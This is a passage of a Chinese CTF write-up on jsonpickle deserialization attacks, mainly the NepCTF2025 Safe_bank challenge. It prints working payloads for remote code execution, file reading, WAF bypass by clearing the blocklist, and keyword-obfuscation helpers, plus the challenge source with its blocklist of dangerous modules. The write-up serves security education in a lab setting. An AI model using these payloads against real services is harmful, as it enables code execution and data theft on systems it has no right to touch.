+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Token</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, timestamp</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.timestamp = timestamp</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#123;&quot;py/object&quot;: &quot;__main__.Token&quot;, &quot;username&quot;: &#123;&quot;py/reduce&quot;: [&#123;&quot;py/function&quot;: &quot;builtins.eval&quot;&#125;, &#123;&quot;py/tuple&quot;: [&quot;__import__(\&#x27;os\&#x27;).popen(\&#x27;whoami\&#x27;).read()&quot;]&#125;]&#125;, &quot;timestamp&quot;: 1733380109.0111294&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp_utf32_be.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-32-be&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(codecs.BOM_UTF32_BE.decode(<span class="string">&#x27;utf-32-be&#x27;</span>) + data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp_utf32_be.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data_bytes = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data_bytes)</span><br><span class="line">token = jsonpickle.decode(data_bytes)</span><br><span class="line"><span class="built_in">print</span>(token.username)</span><br></pre></td></tr></table></figure>
+<p>不过由于WAF先进行<code>json.loads</code>，又<code>json.dumps</code>指定了<code>ensure_ascii=False</code>，使用特殊编码这里就会报错了。</p>
+<p>此外，经过这样转换，unicode编码、hex编码等也会失效</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = json.loads(<span class="string">&#x27;&#123;&quot;a&quot;:&quot;\\u0072\\u0065\\u0064\\u0075\\u0063\\u0065&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(json.dumps(s)) <span class="comment"># &#123;&quot;a&quot;: &quot;reduce&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h2>
+<p>只能在exec中进行绕过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">COMMAND = &quot;import os;os.system(&#x27;/readflag&gt;/app/flag5.txt&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">def string_to_chr(s):</span><br><span class="line">    return &quot;+&quot;.join([f&quot;chr(&#123;ord(c)&#125;)&quot; for c in s])</span><br></pre></td></tr></table></figure>
+<h2 id="nepctf2025-safe_bank"><a class="markdownIt-Anchor" href="#nepctf2025-safe_bank"></a> NepCTF2025-Safe_bank</h2>
+<p>直接参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/19007988">nepctf 2025 web wp - LamentXU - 博客园</a></p>
+<p>进入题目看那个关于我们：</p>
+<p><img src="../images/3392505-20250727210609797-1615567852.png" alt="image" /></p>
+<p>注册登录查看token</p>
+<p><img src="../images/3392505-20250727211042253-1735992130.png" alt="image" /></p>
+<p><img src="../images/3392505-20250727211217039-1594258928.png" alt="image" /></p>
+<p>没有密钥?直接伪造admin</p>
+<p><img src="../images/3392505-20250727211317461-540767477.png" alt="image" /></p>
+<p>访问后是假flag（苦笑）</p>
+<p>将token解码就是jsonpickle的编码形式</p>
+<p>猜测打jsonpickle反序列化</p>
+<p>尝试伪造：</p>
+<p><strong>坑点1：原文里json用的单引号，但是python的后端这里好像只能解析双引号！所以必须把所有单引号改成双引号才可以哦</strong></p>
+<p><strong>坑点2：这里应该用<code>newargsex</code>而不是<code>newargs</code></strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__main__.Session&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;glob.glob&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;py/newargsex&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/set&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/*&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="string">&quot;&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ts&quot;</span><span class="punctuation">:</span><span class="number">1753446254</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="为什么用pynewargs"><a class="markdownIt-Anchor" href="#为什么用pynewargs"></a> 为什么用<strong>py/newargs</strong></h3>
+<p><img src="../images/3392505-20250727211907973-888226621.png" alt="image" /></p>
+<p>这是<code>py/newargsex</code>反序列化的地方</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3392505/202507/3392505-20250727212016993-1284084646.png"><img src="../images/3392505-20250727212016993-1284084646.png" alt="image" /></a></p>
+<p>这是<code>py/newargs</code>反序列化的地方</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3392505/202507/3392505-20250727212125104-902483694.png"><img src="../images/3392505-20250727212125104-902483694.png" alt="image" /></a></p>
+<p>la神解释就是：这里的<code>py/newargs</code>是给实现了<code>__new__</code>的对象用的。而我们的<code>py/newargsex</code>是给没实现<code>__new__</code>的<code>old-style class</code>用的，而且里面的传参必须是以<code>set</code>（数组）的形式传，这样才能保证<code>args, kwargs = obj[tags.NEWARGSEX]</code>在运行时不会出错</p>
+<p>构造上文的payload传进去，一打通。</p>
+<p><img src="../images/3392505-20250727212653026-645446458.png" alt="image" /></p>
+<p>有<code>/readflag</code>，所以得rce</p>
+<p>用payload读源码：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__main__.Session&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linecache.getlines&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;py/newargsex&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/set&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/app/app.py&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="string">&quot;&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ts&quot;</span><span class="punctuation">:</span><span class="number">1753446254</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response, render_template, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Account</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, uid, pwd</span>):</span><br><span class="line">        <span class="variable language_">self</span>.uid = uid</span><br><span class="line">        <span class="variable language_">self</span>.pwd = pwd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Session</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, meta</span>):</span><br><span class="line">        <span class="variable language_">self</span>.meta = meta</span><br><span class="line"></span><br><span class="line">users_db = [</span><br><span class="line">    Account(<span class="string">&quot;admin&quot;</span>, os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()),</span><br><span class="line">    Account(<span class="string">&quot;guest&quot;</span>, <span class="string">&quot;guest&quot;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">for</span> acc <span class="keyword">in</span> users_db:</span><br><span class="line">        <span class="keyword">if</span> acc.uid == username:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    users_db.append(Account(username, password))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">FORBIDDEN = [</span><br><span class="line">    <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;Popen&#x27;</span>, <span class="string">&#x27;nt&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;command&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>,  <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;render_template&#x27;</span>, <span class="string">&#x27;jsonpickle&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;state&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;jinja2&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__func__&#x27;</span>, <span class="string">&#x27;__self__&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__mro__&#x27;</span>, <span class="string">&#x27;__subclasses__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">serialized</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = json.loads(serialized)</span><br><span class="line">        payload = json.dumps(data, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">for</span> bad <span class="keyword">in</span> FORBIDDEN:</span><br><span class="line">            <span class="keyword">if</span> bad <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> bad</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        confirm_password = request.form.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password <span class="keyword">or</span> <span class="keyword">not</span> confirm_password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;所有字段都是必填的。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> password != confirm_password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;密码不匹配。&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">4</span> <span class="keyword">or</span> <span class="built_in">len</span>(password) &lt; <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;用户名至少需要4个字符，密码至少需要6个字符。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> register_user(username, password):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, message=<span class="string">&quot;注册成功！请登录。&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;用户名已存在。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/auth&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>():</span><br><span class="line">    u = request.form.get(<span class="string">&quot;u&quot;</span>)</span><br><span class="line">    p = request.form.get(<span class="string">&quot;p&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> acc <span class="keyword">in</span> users_db:</span><br><span class="line">        <span class="keyword">if</span> acc.uid == u <span class="keyword">and</span> acc.pwd == p:</span><br><span class="line">            sess_data = Session(&#123;<span class="string">&#x27;user&#x27;</span>: u, <span class="string">&#x27;ts&#x27;</span>: <span class="built_in">int</span>(time.time())&#125;)</span><br><span class="line">            token_raw = jsonpickle.encode(sess_data)</span><br><span class="line">            b64_token = base64.b64encode(token_raw.encode()).decode()</span><br><span class="line">            resp = make_response(<span class="string">&quot;登录成功。&quot;</span>)</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;authz&quot;</span>, b64_token)</span><br><span class="line">            resp.status_code = <span class="number">302</span></span><br><span class="line">            resp.headers[<span class="string">&#x27;Location&#x27;</span>] = <span class="string">&#x27;/panel&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, error=<span class="string">&quot;登录失败。用户名或密码无效。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/panel&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">panel</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;authz&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>, error=<span class="string">&quot;缺少Token。&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded = base64.b64decode(token.encode()).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;Token格式错误。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    ban = waf(decoded)</span><br><span class="line">    <span class="keyword">if</span> waf(decoded):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">f&quot;请不要黑客攻击！<span class="subst">&#123;ban&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sess_obj = jsonpickle.decode(decoded, safe=<span class="literal">True</span>)</span><br><span class="line">        meta = sess_obj.meta</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta.get(<span class="string">&quot;user&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;user_panel.html&#x27;</span>, username=meta.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin_panel.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">f&quot;数据解码失败。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/vault&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vault</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;authz&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded = base64.b64decode(token.encode()).decode()</span><br><span class="line">        <span class="keyword">if</span> waf(decoded):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;请不要尝试黑客攻击！&quot;</span>)</span><br><span class="line">        sess_obj = jsonpickle.decode(decoded, safe=<span class="literal">True</span>)</span><br><span class="line">        meta = sess_obj.meta</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta.get(<span class="string">&quot;user&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;访问被拒绝。只有管理员才能查看此页面。&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        flag = <span class="string">&quot;NepCTF&#123;fake_flag_this_is_not_the_real_one&#125;&quot;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;vault.html&#x27;</span>, flag=flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/about&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">about</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;about.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<p>好家伙,waf比我命长</p>
+<h3 id="法一-la神的黑名单抹除大法"><a class="markdownIt-Anchor" href="#法一-la神的黑名单抹除大法"></a> 法一 la神的黑名单抹除大法</h3>
+<p>La神想到了既然这里可以<code>_main__.Session</code>，那是不是可以访问全局变量空间把黑名单抹除了</p>
+<p>赋值覆盖肯定是不可以的，但是可以用函数啊</p>
+<p><img src="../images/3392505-20250727213539530-1760557764.png" alt="image" /></p>
+<p>我们不能把<code>FORBIDDEN</code>赋值为空，但是可以调用<code>FORBIDDEN.clear()</code>函数</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__main__.Session&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span><span class="string">&quot;__main__.FORBIDDEN.clear&quot;</span><span class="punctuation">,</span><span class="attr">&quot;py/newargs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ts&quot;</span><span class="punctuation">:</span><span class="number">1753446254</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/3392505-20250727214121387-700491523.png" alt="image" /></p>
+<p>然后可以通过之前读文件的再读一次源码，会发现<code>FORBIDDEN=[]</code>了</p>
+<p>然后rce不是手到擒来</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__main__.Session&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span><span class="string">&quot;subprocess.getoutput&quot;</span><span class="punctuation">,</span><span class="attr">&quot;py/newargs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/readflag &gt; /app/1.txt&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ts&quot;</span><span class="punctuation">:</span><span class="number">1753446254</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>然后lincache读取/app/1.txt</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__main__.Session&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linecache.getlines&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;py/newargsex&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/set&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/app/1.txt&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="string">&quot;&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ts&quot;</span><span class="punctuation">:</span><span class="number">1753446254</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
